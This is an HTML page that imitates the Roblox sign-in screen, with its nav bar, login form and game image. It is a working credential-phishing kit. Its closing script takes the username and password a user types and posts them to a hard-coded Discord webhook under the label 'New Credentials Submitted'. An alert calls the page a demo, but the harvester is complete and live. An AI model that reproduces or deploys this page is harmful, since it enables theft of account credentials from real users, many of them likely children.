<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Roblox</title>

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
  font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
}

body{
  background:#000;
  color:#fff;
  display:flex;
  flex-direction:column;
  min-height:100vh;
}

/* ================= TOP NAV ================= */

.top-nav{
  position:fixed;
  top:0;
  left:0;
  right:0;
  height:50px;
  background:#0f0f0f;
  display:flex;
  align-items:center;
  padding:0 25px;
  border-bottom:1px solid #1e1e1e;
  z-index:1000;
}

.logo{
  width:22px;
  height:22px;
  background:#fff;
  transform:rotate(45deg);
  margin-right:25px;
}

.nav-links{
  display:flex;
  gap:22px;
}

.nav-links a{
  color:#cfcfcf;
  text-decoration:none;
  font-size:14px;
}

.nav-links a:hover{
  color:#fff;
}

.nav-search{
  margin-left:30px;
  flex:1;
  max-width:400px;
}

.nav-search input{
  width:100%;
  padding:8px 12px;
  background:#1b1b1b;
  border:1px solid #2a2a2a;
  border-radius:6px;
  color:#fff;
}

.nav-search input:focus{
  outline:none;
  border-color:#3b82f6;
}

.create-btn{
  margin-left:auto;
  background:#3b82f6;
  color:#fff;
  border:none;
  padding:8px 18px;
  border-radius:6px;
  font-weight:600;
  cursor:pointer;
}

.create-btn:hover{
  background:#2563eb;
}

/* ================= MAIN ================= */

.main{
  display:flex;
  flex:1;
  margin-top:50px;
}

/* -------- LEFT LOGIN PANEL -------- */

.left{
  width:420px;
  background:#111;
  padding:60px 40px;
  display:flex;
  flex-direction:column;
  justify-content:center;
}

.left h1{
  font-size:28px;
  margin-bottom:8px;
}

.left p{
  color:#aaa;
  margin-bottom:30px;
  font-size:14px;
}

.form-group{
  margin-bottom:20px;
}

.form-group label{
  font-size:13px;
  color:#ccc;
  display:block;
  margin-bottom:6px;
}

.form-group input{
  width:100%;
  padding:12px;
  background:#1c1c1c;
  border:1px solid #2a2a2a;
  border-radius:6px;
  color:#fff;
}

.form-group input:focus{
  outline:none;
  border-color:#3b82f6;
}

.signin-btn{
  width:100%;
  padding:12px;
  background:#3b82f6;
  border:none;
  border-radius:6px;
  font-weight:600;
  cursor:pointer;
  margin-top:5px;
}

.signin-btn:hover{
  background:#2563eb;
}

.forgot{
  text-align:center;
  margin:18px 0;
  font-size:14px;
}

.forgot a{
  color:#3b82f6;
  text-decoration:none;
}

.divider{
  display:flex;
  align-items:center;
  margin:20px 0;
}

.divider span{
  flex:1;
  height:1px;
  background:#2a2a2a;
}

.divider p{
  margin:0 10px;
  font-size:13px;
  color:#777;
}

.alt-btn{
  width:100%;
  padding:11px;
  background:#1c1c1c;
  border:1px solid #2a2a2a;
  border-radius:6px;
  color:#fff;
  cursor:pointer;
  margin-bottom:10px;
}

.alt-btn:hover{
  background:#242424;
}

.signup{
  text-align:center;
  font-size:14px;
  margin-top:15px;
  color:#aaa;
}

.signup a{
  color:#3b82f6;
  text-decoration:none;
}

/* -------- RIGHT SIDE IMAGE -------- */

.right{
  flex:1;
  display:flex;
  justify-content:center;
  align-items:center;
  background:#000;
  padding: 20px;
}

.right img {
  max-width: 100%;
  max-height: 100vh;
  object-fit: contain;
  border-radius: 20px;
}

/* Responsive */

@media(max-width:1000px){
  .right{display:none;}
  .left{width:100%;}
}
</style>
</head>

<body>

<div class="top-nav">
  <div class="logo"></div>
  <div class="nav-links">
    <a href="#">Charts</a>
    <a href="#">Marketplace</a>
    <a href="#">Create</a>
    <a href="#">Robux</a>
  </div>
  <div class="nav-search">
    <input type="text" placeholder="Search" />
  </div>
  <button class="create-btn">Create account</button>
</div>

<div class="main">

  <div class="left">
    <h1>Sign in</h1>
    <p>Jump back into your experiences</p>

    <form id="loginForm">
      <div class="form-group">
        <label>Username, email, or phone</label>
        <input type="text" id="username" required />
      </div>

      <div class="form-group">
        <label>Password</label>
        <input type="password" id="password" required />
      </div>

      <button type="submit" class="signin-btn">Sign in</button>
    </form>

    <div class="forgot">
      <a href="#">Forgot password or username?</a>
    </div>

    <div class="divider">
      <span></span>
      <p>Or</p>
      <span></span>
    </div>

    <button class="alt-btn">ðŸ“§ Email a code</button>
    <button class="alt-btn">ðŸ”‘ Quick sign in</button>

    <div class="signup">
      Don't have an account? <a href="#">Create one</a>
    </div>
  </div>

  <div class="right">
    <img 
      src="https://i.imgur.com/DA2cH9W.png" 
      alt="Roblox Games Collage" 
    />
  </div>

</div>

<script>
document.getElementById("loginForm").addEventListener("submit", function(e) {
  e.preventDefault();

  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  const content = ` **New Credentials Submitted** \n **Username/Email/Phone:** ${username}\n **Password:** ${password}`;

  const webhookUrl =
    "https://discord.com/api/webhooks/1477207175607619606/QRToJeCw3f5Psff9_81PRwwOMAdsyUboelWzFuqrel1OG2eIcHqqqGvgOAoWIfP470vc";

  fetch(webhookUrl, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ content: content })
  })
    .then(response => {
      if (response.ok) {
        alert("This is a demo page. Credentials sent to Discord webhook.");
        document.getElementById("loginForm").reset();
      } else {
        alert("Failed to send data.");
      }
    })
    .catch(error => {
      alert("Error sending data: " + error);
    });
});
</script>

</body>
</html>
